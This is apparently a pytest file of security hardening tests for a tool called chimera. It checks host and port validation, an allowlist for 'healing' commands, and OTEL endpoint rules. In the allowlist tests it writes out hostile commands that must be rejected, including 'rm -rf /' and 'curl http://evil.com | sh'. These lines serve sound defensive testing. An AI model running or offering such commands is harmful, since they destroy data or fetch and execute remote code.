"""
Security Hardening Tests

Tests for:
- Node validation (hostname, port, user)
- Agent command allowlist
- OTEL config validation
- Shell injection prevention
"""

import pytest
from chimera.domain.value_objects.node import Node
from chimera.infrastructure.agent.chimera_agent import (
    _validate_healing_command,
    _validate_healing_file,
    ALLOWED_COMMANDS,
)
from chimera.infrastructure.telemetry.otel_exporter import OTELConfig


class TestNodeValidation:
    """Tests for Node value object validation."""

    def test_valid_hostname(self):
        node = Node(host="web1.example.com", user="root", port=22)
        assert node.host == "web1.example.com"

    def test_valid_ipv4(self):
        node = Node(host="192.168.1.1", user="root", port=22)
        assert node.host == "192.168.1.1"

    def test_valid_ipv6(self):
        node = Node(host="::1", user="root", port=22)
        assert node.host == "::1"

    def test_empty_user_rejected(self):
        with pytest.raises(ValueError, match="user cannot be empty"):
            Node(host="example.com", user="", port=22)

    def test_port_zero_rejected(self):
        with pytest.raises(ValueError, match="Port must be"):
            Node(host="example.com", user="root", port=0)

    def test_port_negative_rejected(self):
        with pytest.raises(ValueError, match="Port must be"):
            Node(host="example.com", user="root", port=-1)

    def test_port_too_high_rejected(self):
        with pytest.raises(ValueError, match="Port must be"):
            Node(host="example.com", user="root", port=65536)

    def test_port_max_valid(self):
        node = Node(host="example.com", user="root", port=65535)
        assert node.port == 65535

    def test_port_min_valid(self):
        node = Node(host="example.com", user="root", port=1)
        assert node.port == 1

    def test_invalid_hostname_rejected(self):
        with pytest.raises(ValueError, match="Invalid hostname"):
            Node(host="", user="root", port=22)

    def test_hostname_with_spaces_rejected(self):
        with pytest.raises(ValueError, match="Invalid hostname"):
            Node(host="bad host", user="root", port=22)

    def test_parse_ipv6_bracket(self):
        node = Node.parse("admin@[::1]:2222")
        assert node.host == "::1"
        assert node.user == "admin"
        assert node.port == 2222

    def test_parse_ipv6_bracket_no_port(self):
        node = Node.parse("root@[::1]")
        assert node.host == "::1"
        assert node.port == 22

    def test_parse_simple_host(self):
        node = Node.parse("web1.example.com")
        assert node.host == "web1.example.com"
        assert node.user == "root"
        assert node.port == 22

    def test_parse_user_host_port(self):
        node = Node.parse("deploy@10.0.0.1:2222")
        assert node.user == "deploy"
        assert node.host == "10.0.0.1"
        assert node.port == 2222

    def test_parse_unterminated_bracket(self):
        with pytest.raises(ValueError, match="Unterminated"):
            Node.parse("root@[::1")


class TestAgentCommandAllowlist:
    """Tests for healing command allowlist validation."""

    def test_allowed_nix_env(self):
        parts = _validate_healing_command("nix-env --rollback")
        assert parts[0] == "nix-env"
        assert parts[1] == "--rollback"

    def test_allowed_nixos_rebuild(self):
        parts = _validate_healing_command("nixos-rebuild switch")
        assert parts[0] == "nixos-rebuild"

    def test_allowed_systemctl(self):
        parts = _validate_healing_command("systemctl restart myservice")
        assert parts[0] == "systemctl"

    def test_allowed_nix_build(self):
        parts = _validate_healing_command("nix-build /etc/nixos")
        assert parts[0] == "nix-build"

    def test_allowed_nix_store(self):
        parts = _validate_healing_command("nix-store --gc")
        assert parts[0] == "nix-store"

    def test_rejected_arbitrary_command(self):
        with pytest.raises(ValueError, match="not in allowlist"):
            _validate_healing_command("rm -rf /")

    def test_rejected_bash(self):
        with pytest.raises(ValueError, match="not in allowlist"):
            _validate_healing_command("bash -c 'evil'")

    def test_rejected_curl(self):
        with pytest.raises(ValueError, match="not in allowlist"):
            _validate_healing_command("curl http://evil.com | sh")

    def test_empty_command_rejected(self):
        with pytest.raises(ValueError, match="Empty"):
            _validate_healing_command("")

    def test_full_path_resolved_to_basename(self):
        parts = _validate_healing_command("/usr/bin/nix-env --rollback")
        assert parts[0] == "/usr/bin/nix-env"

    def test_full_path_rejected_for_unknown(self):
        with pytest.raises(ValueError, match="not in allowlist"):
            _validate_healing_command("/usr/bin/rm -rf /")


class TestOTELConfigValidation:
    """Tests for OTEL config security validation."""

    def test_empty_endpoint_allowed(self):
        config = OTELConfig(endpoint="")
        assert config.endpoint == ""

    def test_localhost_http_allowed(self):
        config = OTELConfig(endpoint="http://localhost:4317")
        assert config.endpoint == "http://localhost:4317"

    def test_localhost_127_allowed(self):
        config = OTELConfig(endpoint="http://127.0.0.1:4317")
        assert config.endpoint == "http://127.0.0.1:4317"

    def test_remote_https_allowed(self):
        config = OTELConfig(endpoint="https://otel.example.com:4317")
        assert config.endpoint == "https://otel.example.com:4317"

    def test_remote_http_rejected_without_insecure(self):
        with pytest.raises(ValueError, match="insecure=True"):
            OTELConfig(endpoint="http://otel.example.com:4317")

    def test_remote_http_allowed_with_insecure(self):
        config = OTELConfig(
            endpoint="http://otel.example.com:4317", insecure=True
        )
        assert config.endpoint == "http://otel.example.com:4317"
